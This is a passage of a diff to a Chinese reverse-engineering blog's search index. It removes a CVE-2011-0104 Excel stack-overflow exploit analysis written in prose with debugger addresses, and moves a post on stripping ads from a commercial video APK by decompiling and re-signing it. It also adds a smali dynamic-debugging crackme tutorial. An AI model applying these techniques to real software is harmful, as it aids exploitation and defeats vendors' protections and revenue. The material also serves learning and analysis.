@@ -1,97 +1,24 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>CVE-2011-0104漏洞分析</title>
-    <url>/2018/07/25/CVE-2011-0104%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><blockquote>
-<p>CVE-2011-0104是microsoft excel在解析XLB文件时导致的一个溢出。xlb文件是Excel表格里面的一个设置文件，通常记录用户的操作，并非恶意文件。溢出可导致执行任意代码。本文在分析漏洞的基础上，简单利用漏洞弹出计算器。</p>
-</blockquote>
+    <title>APK抓包分析去除聚力视频HD的广告</title>
+    <url>/2018/03/09/APK%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90%E5%8E%BB%E9%99%A4%E8%81%9A%E5%8A%9B%E8%A7%86%E9%A2%91HD%E7%9A%84%E5%B9%BF%E5%91%8A/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>目前视频播放类APK在播放前都会播放一段广告，短则几十秒，多则一分多钟。当然Vip会员就不会有广告播放，毕竟这也是人家重要的的收入来源。本文就用抓取流量包的方式获取到广告的url的地址，进而在播放视频时不会有广告的播放。实验所用的APK为“聚力视频HD”，这款应用没有做什么保护，分析操作起来较容易。</p>
 <a id="more"></a>
-<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><blockquote>
-<p>系统：Windows xp pro sp2<br>软件：windows office 2003<br>调试器：immunity Debugger<br>Poc生成：漏洞战争配套资料</p>
-</blockquote>
-<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><ul>
-<li>打开一个空白的excel程序</li>
-<li>打开immunity Debugger,附加excel进程</li>
-<li>按下F9将程序运行起来。</li>
-<li>在打开的excel中使用file–&gt;open打开配套资料中的exploit.xlb文件。</li>
-</ul>
-<blockquote>
-<p>异常触发：</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/1.png" alt="cve-2011-0104"></p>
-<blockquote>
-<p>可以看到异常是一个访问异常。这时要查找异常产生的源头。向上查看代码，重点关注</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>以上两个代码是函数开始处的常规操作，向上找可以发现0x300ce252地址处为函数开始。这个就是出错函数的起始位置 </p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/2.png" alt="cve-2011-0104"></p>
-<blockquote>
-<p>再次重新加载程序，在0x300ce252地址处下断点，并对esp栈顶内存下写入断点。这里对此做一个解释，为什么下这个断点呢。因为漏洞在复制数据时会覆盖此地址，此地址是调用0x300ce252函数的返回地址。一旦数据覆盖进行写入操作，就会触发断点，这就定位到了异常出错位置。</p>
-</blockquote>
-<ul>
-<li>打开一个空白的excel程序</li>
-<li>打开immunity Debugger,附加excel进程</li>
-<li>使用bp 300ce252命令下断点。</li>
-<li>按下F9将程序运行起来。</li>
-<li>在打开的excel中使用file–&gt;open打开配套资料中的exploit.xlb文件。</li>
-<li>程序断下</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/3.png" alt="cve-2011-0104"></p>
-<blockquote>
-<p>内存断点下好后，F9运行，可以看到程序停在了0x300ce3c8地址处，又是一个复制数据出错。</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/4.png" alt="cve-2011-0104"></p>
-<blockquote>
-<p>观察寄存器ebp和edi,之间的大小就是允许复制的数据。计算可得为0x60字节大小。</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/5.png" alt="cve-2011-0104"></p>
-<blockquote>
-<p>分析可知复制了96个字节，edi的值递增覆盖到栈顶0x13aa90,后面利用的跳板地址。单步运行到程序末尾处，返回可以发现是出错复制代码位于call 0x300ce380中。</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/6.png" alt="cve-2011-0104"></p>
-<blockquote>
-<p>为了后面更好的搞清楚栈的覆盖和漏洞利用，有必要梳理下函数调用关系。<br><strong>1.</strong>首先定位在0x300ce252,单步运行程序，一步步通过观察堆栈内容是否覆盖来判断程序调用流程。再次重新加载程序。加载过程同上。</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/7.png" alt="cve-2011-0104"></p>
-<blockquote>
-<p>经过0x302188d8地址处的call excel.306deefe后，栈区被一些乱七八糟的数据填充。可以判断，异常位于这个call中。</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/8.png" alt="cve-2011-0104"></p>
-<blockquote>
-<p><strong>2.</strong>下面要做的就是重新加载程序，在0x302188d8地址处下断点，然后进入call深入分析。<br>进入函数中可以看到。</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/9.png" alt="cve-2011-0104"></p>
-<blockquote>
-<p>梳理总结下流程。</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/10.png" alt="cve-2011-0104"></p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><blockquote>
-<p>调试分析可以总结得到，数据覆盖的是sub_300ce252函数的返回地址。也就是栈地址0x13aa90。有了返回地址，还要注意到返回时的ret 2c指令，收回了44个空间大小的数据。这样基本就可以完成漏洞利用了。但当程序运行到0x300CE361处的MOV DWORD PTR DS:[EAX],ECX时出现访问违例：访问到一个不可写的地址0x51453844，此时EAX=0x51453844，向上回溯程序，找出EAX的赋值处，发现在0x300CE354处出现给EAX赋值的操作: MOV EAX, DWORD PTR SS:[EBP+2C]，此时EBP=0x0013AA8C,EBP+2C=0x0013AAB8,0x0013AAB8处的值恰好是0x51453844。观察栈中的数据，51453844恰好又是shellcode中的数据。</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/11.png" alt="cve-2011-0104"></p>
-<blockquote>
-<p>根据栈区和样本数据中对应出现的数据，修改相应数值，并添加shellcode。即可利用。</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/12.png" alt="cve-2011-0104"></p>
-<blockquote>
-<p>利用效果</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/13.png" alt="cve-2011-0104"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
-<p>这次由于时间原因，写的比较仓促可能具体细节不怎么具体。后续再补上，欢迎交流指导。</p>
-</blockquote>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0104" target="_blank" rel="noopener">cve-2011-0104</a><br><a href="https://bbs.pediy.com/thread-217940.htm" target="_blank" rel="noopener">看雪的精品文章</a><br><a href="http://www.cnblogs.com/Ox9A82" target="_blank" rel="noopener">Ox9A82</a><br><a href="https://www.securityfocus.com/bid/47245" target="_blank" rel="noopener">安全焦点</a></p>
+<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><h3 id="Charles抓包环境配置"><a href="#Charles抓包环境配置" class="headerlink" title="Charles抓包环境配置"></a>Charles抓包环境配置</h3><p>抓包工具使用Charles,工具好像要收费，但网上也有破解版。使用该工具需要做一些配置。工具界面如下：<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t1.png" alt="Charles界面-1"></p>
+<ol>
+<li>首先要保证手机与电脑要在同一网段内.(这里使用的是夜神模拟器)</li>
+<li>查看电脑的IP地址。打开cmd,输入ipconfig。这里本机地址是192.168.1.103<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t2.png" alt="本机IP-2"></li>
+<li>设置模拟器IP及port。<br>找到模拟器的设置，点击无线WLAN<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t3.png" alt="模拟器无线界面-3"><br>长按WiredSSID，弹出修改网络提示框。修改网络。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t4.png" alt="修改网络-4"><br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t5.png" alt="修改地址及端口-5"> </li>
+<li>打开电脑Charles会出现一个提示框，点击allow即可。这样就配置好了。<h3 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h3><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t6.png" alt="Charles抓包界面-6"><br>打开聚力视频，会发现Charles抓了很多包，但并没有用，因为还没有播放视频。点击类似扫把的按钮，将数据包清空。再随便找一个视频打开。抓了很多包后就暂时退出此应用，不然抓包还会更多。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t7.png" alt="流量抓包-7"><br>可以看到抓了很多流量包，这时就要留意这些链接了。重点关注带有ad的链接。观察返回的json。返回图片的可以忽略。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t8.png" alt="可疑地址-8"><br>这里先看第二个链接：<a href="http://ads.data.pplive.com" target="_blank" rel="noopener">http://ads.data.pplive.com</a>.<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t9.png" alt="可以链接2-9"><br>复制链接到浏览器中，看会返回什么信息。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t10.png" alt="浏览器返回-10"><br>只是在界面上显示了个ok，并没有什么信息。这个应该不是我们要找的广告链接。<br>这里再看第一个链接：<a href="http://de.as.pptv.com。同样的将url复制到浏览器中，看返回信息。" target="_blank" rel="noopener">http://de.as.pptv.com。同样的将url复制到浏览器中，看返回信息。</a><br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t11.png" alt="浏览器返回-11"><br>可以看到返回了一个xml文件，里面包含了很多信息。查看有没有MP4,flv结尾的链接。果不其然发现了一个后缀为MP4的链接。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t12.png" alt="广告视频地址-12"><br>将连接拷贝到浏览器中查看是否为刚才播放的广告。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t13.png" alt="广告界面-13"><br>这样就找到了广告链接。<h3 id="广告链接确认"><a href="#广告链接确认" class="headerlink" title="广告链接确认"></a>广告链接确认</h3>为了确认这个到底真的是不是广告链接。可以将这些域名重定向到另外一个不存在的服务地址，在链接上右键-<img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t14.png" alt="map remote-14"><br>修改域名后，点击播放手机视频，看看播放是否正常，还有没有广告播放。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t15.png" alt="广告播放-15"><br>可以看到广告已经不再播放了。可以确认这就是播放广告的链接。接下来就是源码修改了<h2 id="破解方案"><a href="#破解方案" class="headerlink" title="破解方案"></a>破解方案</h2><h3 id="签名校验检测"><a href="#签名校验检测" class="headerlink" title="签名校验检测"></a>签名校验检测</h3>签名校验，最简单的就是将apk包反编译后再回编译签名，安装。看程序能否正常运行（有广告，并没有破解）。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t16.png" alt="签名校验-16"><h3 id="破解apk"><a href="#破解apk" class="headerlink" title="破解apk"></a>破解apk</h3>使用Android killer反编译聚力视频，当然也可以使用其他的工具，个人爱好。反编译结束后，在搜索框输入链接字符串“<a href="http://de.as.pptv.com”" target="_blank" rel="noopener">http://de.as.pptv.com”</a><br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t17.png" alt="android killer-17"><br>可以发现有若干相似字符，但我们要注意到抓包的路径“<a href="http://de.as.pptv.com/lkandelivery/vast/3.0draft”。好像都和ad有关。直接将所有字符串替换为空。" target="_blank" rel="noopener">http://de.as.pptv.com/lkandelivery/vast/3.0draft”。好像都和ad有关。直接将所有字符串替换为空。</a><br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t18.png" alt="替换字符串-18"><br>然后保存，回编译，签名。安装。<br>看下播放视频还会不会有广告播放。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t19.png" alt="广告拦截-19"></li>
+</ol>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>经过了抓包，分析后找到正确的链接。本文章主要是介绍抓包分析过程，所以对apk文件并没有很强的要求。爱奇艺对广告链接就封装的很好，抓包不会发现任何有关广告的链接。通过DDMS的输出才会发现广告链接，进而才会发现其广告是通过libcupid.so完成的。而且还有签名校验。搜狐视频的广告链接可以通过抓包获取到，但有签名校验的存在。因为本章节主要是介绍抓包分析，所以并不做过多介绍。</p>
 ]]></content>
       <categories>
-        <category>漏洞分析</category>
+        <category>逆向技术学习</category>
       </categories>
       <tags>
-        <tag>CVE</tag>
-        <tag>文档漏洞</tag>
-        <tag>栈溢出</tag>
+        <tag>APK去广告</tag>
       </tags>
   </entry>
   <entry>
@@ -425,109 +352,339 @@
       </tags>
   </entry>
   <entry>
-    <title>APK抓包分析去除聚力视频HD的广告</title>
-    <url>/2018/03/09/APK%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90%E5%8E%BB%E9%99%A4%E8%81%9A%E5%8A%9B%E8%A7%86%E9%A2%91HD%E7%9A%84%E5%B9%BF%E5%91%8A/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>目前视频播放类APK在播放前都会播放一段广告，短则几十秒，多则一分多钟。当然Vip会员就不会有广告播放，毕竟这也是人家重要的的收入来源。本文就用抓取流量包的方式获取到广告的url的地址，进而在播放视频时不会有广告的播放。实验所用的APK为“聚力视频HD”，这款应用没有做什么保护，分析操作起来较容易。</p>
+    <title>Android Studio+夜神模拟器 动态调试APK</title>
+    <url>/2018/03/03/Android%20Studio+%E5%A4%9C%E7%A5%9E%E6%A8%A1%E6%8B%9F%E5%99%A8%20%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95APK/</url>
+    <content><![CDATA[<h2 id="1-smali文件格式"><a href="#1-smali文件格式" class="headerlink" title="1 smali文件格式"></a>1 smali文件格式</h2><table>
+<thead>
+<tr>
+<th align="left">头部定义</th>
+<th align="center">域定义</th>
+<th align="right">函数定义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">.class</td>
+<td align="center">.field public</td>
+<td align="right">.method</td>
+</tr>
+<tr>
+<td align="left">.super</td>
+<td align="center">.field static</td>
+<td align="right">instruction</td>
+</tr>
+<tr>
+<td align="left">.source</td>
+<td align="center">.field private</td>
+<td align="right">.endmethod</td>
+</tr>
+</tbody></table>
 <a id="more"></a>
-<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><h3 id="Charles抓包环境配置"><a href="#Charles抓包环境配置" class="headerlink" title="Charles抓包环境配置"></a>Charles抓包环境配置</h3><p>抓包工具使用Charles,工具好像要收费，但网上也有破解版。使用该工具需要做一些配置。工具界面如下：<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t1.png" alt="Charles界面-1"></p>
-<ol>
-<li>首先要保证手机与电脑要在同一网段内.(这里使用的是夜神模拟器)</li>
-<li>查看电脑的IP地址。打开cmd,输入ipconfig。这里本机地址是192.168.1.103<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t2.png" alt="本机IP-2"></li>
-<li>设置模拟器IP及port。<br>找到模拟器的设置，点击无线WLAN<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t3.png" alt="模拟器无线界面-3"><br>长按WiredSSID，弹出修改网络提示框。修改网络。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t4.png" alt="修改网络-4"><br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t5.png" alt="修改地址及端口-5"> </li>
-<li>打开电脑Charles会出现一个提示框，点击allow即可。这样就配置好了。<h3 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h3><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t6.png" alt="Charles抓包界面-6"><br>打开聚力视频，会发现Charles抓了很多包，但并没有用，因为还没有播放视频。点击类似扫把的按钮，将数据包清空。再随便找一个视频打开。抓了很多包后就暂时退出此应用，不然抓包还会更多。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t7.png" alt="流量抓包-7"><br>可以看到抓了很多流量包，这时就要留意这些链接了。重点关注带有ad的链接。观察返回的json。返回图片的可以忽略。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t8.png" alt="可疑地址-8"><br>这里先看第二个链接：<a href="http://ads.data.pplive.com" target="_blank" rel="noopener">http://ads.data.pplive.com</a>.<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t9.png" alt="可以链接2-9"><br>复制链接到浏览器中，看会返回什么信息。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t10.png" alt="浏览器返回-10"><br>只是在界面上显示了个ok，并没有什么信息。这个应该不是我们要找的广告链接。<br>这里再看第一个链接：<a href="http://de.as.pptv.com。同样的将url复制到浏览器中，看返回信息。" target="_blank" rel="noopener">http://de.as.pptv.com。同样的将url复制到浏览器中，看返回信息。</a><br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t11.png" alt="浏览器返回-11"><br>可以看到返回了一个xml文件，里面包含了很多信息。查看有没有MP4,flv结尾的链接。果不其然发现了一个后缀为MP4的链接。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t12.png" alt="广告视频地址-12"><br>将连接拷贝到浏览器中查看是否为刚才播放的广告。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t13.png" alt="广告界面-13"><br>这样就找到了广告链接。<h3 id="广告链接确认"><a href="#广告链接确认" class="headerlink" title="广告链接确认"></a>广告链接确认</h3>为了确认这个到底真的是不是广告链接。可以将这些域名重定向到另外一个不存在的服务地址，在链接上右键-<img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t14.png" alt="map remote-14"><br>修改域名后，点击播放手机视频，看看播放是否正常，还有没有广告播放。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t15.png" alt="广告播放-15"><br>可以看到广告已经不再播放了。可以确认这就是播放广告的链接。接下来就是源码修改了<h2 id="破解方案"><a href="#破解方案" class="headerlink" title="破解方案"></a>破解方案</h2><h3 id="签名校验检测"><a href="#签名校验检测" class="headerlink" title="签名校验检测"></a>签名校验检测</h3>签名校验，最简单的就是将apk包反编译后再回编译签名，安装。看程序能否正常运行（有广告，并没有破解）。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t16.png" alt="签名校验-16"><h3 id="破解apk"><a href="#破解apk" class="headerlink" title="破解apk"></a>破解apk</h3>使用Android killer反编译聚力视频，当然也可以使用其他的工具，个人爱好。反编译结束后，在搜索框输入链接字符串“<a href="http://de.as.pptv.com”" target="_blank" rel="noopener">http://de.as.pptv.com”</a><br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t17.png" alt="android killer-17"><br>可以发现有若干相似字符，但我们要注意到抓包的路径“<a href="http://de.as.pptv.com/lkandelivery/vast/3.0draft”。好像都和ad有关。直接将所有字符串替换为空。" target="_blank" rel="noopener">http://de.as.pptv.com/lkandelivery/vast/3.0draft”。好像都和ad有关。直接将所有字符串替换为空。</a><br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t18.png" alt="替换字符串-18"><br>然后保存，回编译，签名。安装。<br>看下播放视频还会不会有广告播放。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t19.png" alt="广告拦截-19"></li>
+
+<h2 id="2-准备"><a href="#2-准备" class="headerlink" title="2 准备"></a>2 准备</h2><p>Android studio（简称AS）<br>smalidea-0.05.zip(插件)<br>android killer(修改smali文件)<br>夜神模拟器<br>实验程序 crakme02.apk</p>
+<h3 id="2-1-修改AndroidManifest-xml"><a href="#2-1-修改AndroidManifest-xml" class="headerlink" title="2.1 修改AndroidManifest.xml"></a>2.1 修改AndroidManifest.xml</h3><p>使用apktool.jar反编译apk。命令：java -jar apktool.jar d -f xxx.apk<br>会生成xxx文件夹。动态调试需要在AndroidManifest.xml添加可调试属性android:debuggable=”true”<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p1.jpg" alt="xml表"><br>修改后同样使用apktool.jar进行回编译。命令：java -jar apktool.jar b -f xxx.apk（未签名）<br>打包后的apk并没有签名。可以使用jdk自带的keytool生成keystore,然后使用jarsigner进行签名。<br>以上过程可以使用一些工具来进行修改。反编译后的xxx文件夹是加载到android studio中的源代码。回编译的apk是安装在夜神模拟器中的。</p>
+<h3 id="2-2-AS安装smalidea插件"><a href="#2-2-AS安装smalidea插件" class="headerlink" title="2.2 AS安装smalidea插件"></a>2.2 AS安装smalidea插件</h3><p>这里的smalidea-0.05.zip插件是下载好的。<br>依次点击File–&gt;setting–&gt;Plugins点击<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p2.jpg" alt="安装选取"><br>从磁盘安装后点击apply–&gt;ok–&gt;重启即可</p>
+<h3 id="2-3-夜神模拟器连接DDMS"><a href="#2-3-夜神模拟器连接DDMS" class="headerlink" title="2.3 夜神模拟器连接DDMS"></a>2.3 夜神模拟器连接DDMS</h3><ol>
+<li>启动模拟器</li>
+<li>cd进入到夜神安装bin目录下，执行命令nox_adb.exe connect 127.0.0.1:62001</li>
+<li>如果命令执行错误。可能是nox_adb.exe版本不对，下载相应版本的替换即可。<br>我这里是配合了环境变量，并将nox_adb.exe connect 127.0.0.1:62001命令做成一个bat。直接运行图方便。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p4.jpg" alt="启动模拟器"><br><strong>模拟器启动后安装回编译并签名的apk</strong><h2 id="3-调试"><a href="#3-调试" class="headerlink" title="3 调试"></a>3 调试</h2><h3 id="3-1-导入源码"><a href="#3-1-导入源码" class="headerlink" title="3.1 导入源码"></a>3.1 导入源码</h3>将反编译的xxx文件夹加载到AS，类似加载一个安卓工程（导入….）界面如下:<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p5.jpg" alt="源码导入"><h3 id="3-2-设置远程调试"><a href="#3-2-设置远程调试" class="headerlink" title="3.2 设置远程调试"></a>3.2 设置远程调试</h3>打开AS，依次点击Run–&gt;edit configurations如图示：<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p6.jpg" alt="配置远程调试"><br>点击+号，添加remote配置。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p7.jpg" alt="添加远程"><br>项目名字随便填，其余地方已用箭头标记<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p8.jpg" alt="配置端口"><h3 id="3-3-打开-Android-device-Monitor"><a href="#3-3-打开-Android-device-Monitor" class="headerlink" title="3.3 打开 Android device Monitor"></a>3.3 打开 Android device Monitor</h3><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p9.jpg" alt="打开ddms"><br>因为模拟器上没有运行什么应用，所以列表中并没有什么应用显示<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p10.jpg" alt="程序列表显示"><h3 id="3-4-下断点并开启调试"><a href="#3-4-下断点并开启调试" class="headerlink" title="3.4 下断点并开启调试"></a>3.4 下断点并开启调试</h3>这是一个检测输入是否正确的apk，所以断点就下到checkSN函数处，在代码最左边单击即可。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p11.jpg" alt="下调试断点"><br>打开cmd  输入 <code>adb shell am start -D -n com.droider.crackme0201/.MainActivity（包名/启动主activity）</code><br>然后模拟器会显示等待调试的弹出框<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p12.jpg" alt="启动调试"><br>接下来就是在AS中启动程序了Run—&gt;debug<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p13.jpg" alt="运行程序"><br>DDMS中也会显示调试程序包名<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p14.jpg" alt="ddms显示"><br>可以看到模拟器已经在程序中启动，而且ddms中红色的甲壳虫也变绿。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p15.png" alt="模拟器显示"><br>接下来我们随意输入，将程序停在所下断点处。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p16.png" alt="断点处"><br>可以看到断点已经停下。后续单步调试，查看变量等操作在这里就不介绍。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p17.png" alt="变量显示"><br>个人总结过程，仅供参考。</li>
 </ol>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>经过了抓包，分析后找到正确的链接。本文章主要是介绍抓包分析过程，所以对apk文件并没有很强的要求。爱奇艺对广告链接就封装的很好，抓包不会发现任何有关广告的链接。通过DDMS的输出才会发现广告链接，进而才会发现其广告是通过libcupid.so完成的。而且还有签名校验。搜狐视频的广告链接可以通过抓包获取到，但有签名校验的存在。因为本章节主要是介绍抓包分析，所以并不做过多介绍。</p>
-]]></content>
-      <categories>
-        <category>逆向技术学习</category>
-      </categories>
-      <tags>
-        <tag>APK去广告</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Xposed框架使用初探(一)</title>
-    <url>/2018/03/15/Xposed%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8%E5%88%9D%E6%8E%A2(%E4%B8%80)/</url>
-    <content><![CDATA[<h2 id="Hook简介"><a href="#Hook简介" class="headerlink" title="Hook简介"></a>Hook简介</h2><blockquote>
-<p>Hook英文翻译即为钩子。windows下的Hook是一种消息处理机制。每当特定的消息发出，在没有到达目的窗口前，钩子程序就先捕获该消息，即钩子函数先得到控制权，这时钩子函数就可以对消息进行加工处理。它其实是一个处理消息的程序段。当然在安卓系统中也有Hook技术，和windows下的Hook类似，也是在事件传送到终点前截获并监控事件的传输，并对所钩上的事件作出相应的处理。</p>
-</blockquote>
-<a id="more"></a>
-<h2 id="xposed框架"><a href="#xposed框架" class="headerlink" title="xposed框架"></a>xposed框架</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><blockquote>
-<p>Xposed框架是一款对安卓平台的HOOK框架，可以在不修改APK的情况下修改程序的框架服务。通过替换/system/bin/app_process程序控制Zygote进程，从而使app_process在启动过程中加载XposedBridge.jar这个jar包。Zygote进程在启动过程中，会创建一个Dalvik虚拟机实例，还会把java运行时库加载到进程中来，以及注册一些Android核心类的JNI方法来前面创建的Dalvik虚拟机实例中去，应用程序进程会与Zygote一起共享Java运行时库。这就是XposedBridge.jar包可以加载的原因。</p>
-</blockquote>
-<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><blockquote>
-<p>Xposed框架本质只是一个apk应用，可安装到手机。相应模块(Hook代码)就需要我们去编写，模块也是apk文件。</p>
-</blockquote>
-<ol>
-<li><p>手机必须是具有Root权限的。Root是有一定风险的。所以这里使用的是模拟器。</p>
-</li>
-<li><p>实验设备：夜神模拟器+Android4.4.2+XposedInstall.apk(v2.7)+XposedBridge.jar-54。</p>
-</li>
-<li><p>Xposed框架安装效果如下：<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/photo-180315/p1.png" alt="效果图-1"></p>
-<h2 id="Xposed使用示例"><a href="#Xposed使用示例" class="headerlink" title="Xposed使用示例"></a>Xposed使用示例</h2><h3 id="需要被Hook的程序"><a href="#需要被Hook的程序" class="headerlink" title="需要被Hook的程序"></a>需要被Hook的程序</h3><blockquote>
-<p>程序界面如下</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/photo-180315/p2.png" alt="界面-2"></p>
-<blockquote>
-<p>源代码如下:</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/photo-180315/p3.jpg" alt="源代码-3"></p>
-<blockquote>
-<p>源代码逻辑很简单，输入一段字符串，然后在compare函数中比较。根据返回值判断输入是否正确。因为这只是做一个示例，compare函数中直接用了equals函数来比较。在代码编程中这是很愚蠢的做法，强烈不建议这种写法。<br>如果想让程序返回正确的值，只要将compare的返回值为true即可。我们这里Hook的就是compare函数，不管输入任意字符，都会显示返回成功。</p>
-</blockquote>
-<h3 id="Hook关键函数介绍"><a href="#Hook关键函数介绍" class="headerlink" title="Hook关键函数介绍"></a>Hook关键函数介绍</h3><blockquote>
-<p>IXposedHookLoadPackage类：加载回调接口，在Xposed入口类继承，实现handleLoadPackage方法。<br>handleLoadPackage：这个方法用于在加载应用程序的包的时候执行用户的操作。<br>findAndHookMethod(String className, ClassLoader classLoader, String methodName, Object… parameterTypesAndCallback) hook一个类中的方法<br>参数:<br>className: 要hook的方法的所在类<br>classloader: 要hook的包的classLoader，一般都写loadPackageParam.classLoader<br>methodName: 要hook的方法<br>parameterTypesAndCallback: 方法的参数和监听器。</p>
-</blockquote>
